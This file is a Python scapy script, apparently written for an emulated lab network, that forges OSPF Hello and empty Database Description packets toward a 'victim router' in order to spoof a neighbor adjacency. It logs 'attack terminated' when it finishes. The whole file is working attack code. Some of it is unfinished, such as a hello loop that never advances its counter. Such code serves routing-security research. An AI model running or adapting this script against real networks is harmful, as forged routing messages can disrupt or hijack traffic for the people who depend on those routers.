#!/usr/bin/env python

import termcolor as T # grey red green yellow blue magenta cyan white
import os
import sys
import ctypes
import datetime

from subprocess import Popen, PIPE
from scapy.all import *
from random import randint
from time import sleep
from utils import log, log2


load_contrib("ospf")


SOURCE_ADDRESS = '10.0.1.3'
DESTINATION_ADDRESS = '10.0.1.2'
HELLO_DESTINATION_MAC_ADDRESS = '01:00:5e:00:00:05'
HELLO_DESTINATION_ADDRESS = '224.0.0.5'

HELLO_INTERVAL = 10
DEAD_INTERVAL = 40
TTL = 64 # set to a value greater than 1 in order to be forwarded towards the victim router

OUTPUT_INTERFACE = 'atk1-eth0'

eight_bit_space = [1L, 2L, 4L, 8L, 16L, 32L, 64L, 128L]


def send_hello_packet(iface, srcMAC, dstMAC, srcIP, dstIP):
	eth_header = Ether(src=srcMAC, dst=dstMAC)

	ttl = None

	if dstIP == HELLO_DESTINATION_ADDRESS:
		ttl = 1
	else:
		ttl = TTL

	ip_header = IP(src=srcIP, dst=dstIP, ttl=ttl, proto=89)

	ospf_header = OSPF_Hdr(\
		src='2.2.2.3')

	ospf_payload = OSPF_Hello(\
		hellointerval=HELLO_INTERVAL, \
		deadinterval=DEAD_INTERVAL,\
		mask='255.255.255.0',\
		neighbors=['2.2.2.2', '1.1.1.1'],\
		router='10.0.1.3',\
		backup='10.0.1.2',\
		options=2L) 
		# 2L = External Routing

	frame = eth_header/ip_header/ospf_header/ospf_payload
	frame.show()

	sendp(frame, iface=iface)


def send_empty_dbd_messages(iface, srcMAC, dstMAC, srcIP, dstIP, n, interval):
	eth_header = Ether(src=srcMAC, dst=dstMAC)

	ip_header = IP(src=srcIP, dst=dstIP, ttl=TTL, proto=89)

	seqNum = randint(0, 2147483648)

	ospf_header = OSPF_Hdr(\
		src='2.2.2.3',\
		type=2)

	ospf_payload = OSPF_DBDesc(options=2L) # 2L = E => External Routing

	frame = eth_header/ip_header/ospf_header/ospf_payload
	frame.show()

	for i in xrange(0, n):
		log('sending dbd message %d with seqNum %d' % (i+1, seqNum + i), 'red')

		sleep(interval)

		frame.payload.payload.payload.ddseq = seqNum + i

		if i == 0:
			# 7L = I, M, MS => Init, More, Master
			frame.payload.payload.payload.dbdescr = 7L
		else:
			# 1L = MS => Master
			frame.payload.payload.payload.dbdescr = 1L

		sendp(frame, iface=iface)


def send_hello_packets(iface, srcMAC, dstMAC, srcIP, dstIP, interval):
	eth_header = Ether(src=srcMAC, dst=dstMAC)

	ip_header = IP(src=srcIP, dst=dstIP, ttl=TTL, proto=89)

	ospf_header = OSPF_Hdr(\
		src='2.2.2.3')

	ospf_payload = OSPF_Hello(\
		hellointerval=HELLO_INTERVAL, \
		deadinterval=DEAD_INTERVAL,\
		mask='0.0.0.0',\
		neighbors=['2.2.2.2', '1.1.1.1'],\
		#router='10.0.1.3',\
		#backup='10.0.1.2',\
		options=2L)

	frame = eth_header/ip_header/ospf_header/ospf_payload
	frame.show()	

	i = 0

	while True:
		log('sending %d-th hello message' % i+1, 'red')

		sleep(interval)

		send_hello_packet(iface, srcMAC, dstMAC, srcIP, dstIP)


def main():
	iface = sys.argv[1]
	src_mac_address = sys.argv[2]
	dst_mac_address = sys.argv[3]

	assert iface is not None
	assert src_mac_address is not None
	assert dst_mac_address is not None

	print
	print 'interface', iface
	print 'source MAC address', src_mac_address
	print 'destination MAC address', dst_mac_address

	# FIXME
	# R3 does not forward Hello packet

	# test1
	#send_hello_packet(OUTPUT_INTERFACE, src_mac_address, dst_mac_address, SOURCE_ADDRESS, DESTINATION_ADDRESS)

	# test2
	# HELLO_DESTINATION_ADDRESS => TTL != 1 for a packet sent to the Local Network Control Block
	send_hello_packet(iface, src_mac_address, HELLO_DESTINATION_MAC_ADDRESS, SOURCE_ADDRESS, HELLO_DESTINATION_ADDRESS)

	send_empty_dbd_messages(iface, src_mac_address, dst_mac_address, SOURCE_ADDRESS, DESTINATION_ADDRESS, 10, 2)

	# TODO implement properly following messages
	send_hello_packets(iface, src_mac_address, dst_mac_address, SOURCE_ADDRESS, DESTINATION_ADDRESS, 39)

	log('attack terminated', 'red')


if __name__ == "__main__":
	main()
